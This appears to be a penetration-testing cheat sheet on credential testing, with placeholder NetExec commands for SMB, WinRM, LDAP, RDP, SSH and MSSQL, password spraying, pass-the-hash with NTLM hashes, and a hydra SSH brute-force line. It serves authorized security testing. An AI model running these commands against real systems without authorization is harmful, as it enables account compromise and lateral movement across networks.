# Credential Testing

## Objective

Validate discovered credentials (passwords and NTLM hashes) across all exposed services to identify accessible systems, enable lateral movement, and uncover privilege escalation opportunities.

---

## 1. Test Credentials Across All Services

Never assume credentials only work on one service. Test them against every exposed protocol.

### SMB

```bash
nxc smb <TARGET_IP> -u <USER> -p <PASSWORD>
```

### WinRM

```bash
nxc winrm <TARGET_IP> -u <USER> -p <PASSWORD>
```

### LDAP

```bash
nxc ldap <TARGET_IP> -u <USER> -p <PASSWORD>
```

### RDP

```bash
nxc rdp <TARGET_IP> -u <USER> -p <PASSWORD>
```

### SSH

```bash
nxc ssh <TARGET_IP> -u <USER> -p <PASSWORD>
```

### MSSQL

```bash
nxc mssql <TARGET_IP> -u <USER> -p <PASSWORD>
```

> **Tip:** A credential that fails on one protocol may still authenticate successfully on another.

---

## 2. Test Local Authentication

Always test local authentication when targeting member servers or workstations.

### SMB

```bash
nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --local-auth
```

### WinRM

```bash
nxc winrm <TARGET_IP> -u <USER> -p <PASSWORD> --local-auth
```

### RDP

```bash
nxc rdp <TARGET_IP> -u <USER> -p <PASSWORD> --local-auth
```

> **Why?**
>
> Local administrator passwords may differ from domain credentials and are commonly reused across systems.

---

## 3. Password Spraying

After collecting usernames, perform password spraying using common or recovered passwords.

### Spray a Single Password

```bash
nxc smb <TARGET_IP> -u users.txt -p 'Password123!'
```

### Spray Multiple Passwords

```bash
nxc smb <TARGET_IP> -u users.txt -p passwords.txt
```

> **Note:** Respect account lockout policies before spraying.

```bash
nxc smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' --pass-pol
```

---

## 4. Test NTLM Hashes

If NTLM hashes are recovered, test them across supported protocols.

### SMB

```bash
nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH>
```

### WinRM

```bash
nxc winrm <TARGET_IP> -u <USER> -H <NTLM_HASH>
```

### MSSQL

```bash
nxc mssql <TARGET_IP> -u <USER> -H <NTLM_HASH>
```

> **Purpose:** Determine whether Pass-the-Hash authentication is possible.

---

## 5. SSH Authentication

If SSH is exposed and a valid username has been identified, test password authentication.

### Test a Known Password

```bash
nxc ssh <TARGET_IP> -u <USER> -p <PASSWORD>
```

### Brute Force (When Authorized)

```bash
hydra -L users.txt -P passwords.txt ssh://<TARGET_IP>
```

> **Note:** Only perform brute-force attacks when explicitly permitted by the engagement scope.

---

## Tips

- Test every newly discovered credential immediately.
- Verify both domain and local authentication.
- Password reuse across services is common.
- Service accounts often have access to SMB, WinRM, MSSQL, or LDAP.
- Successful authentication does not always imply administrative privileges—continue with privilege enumeration.
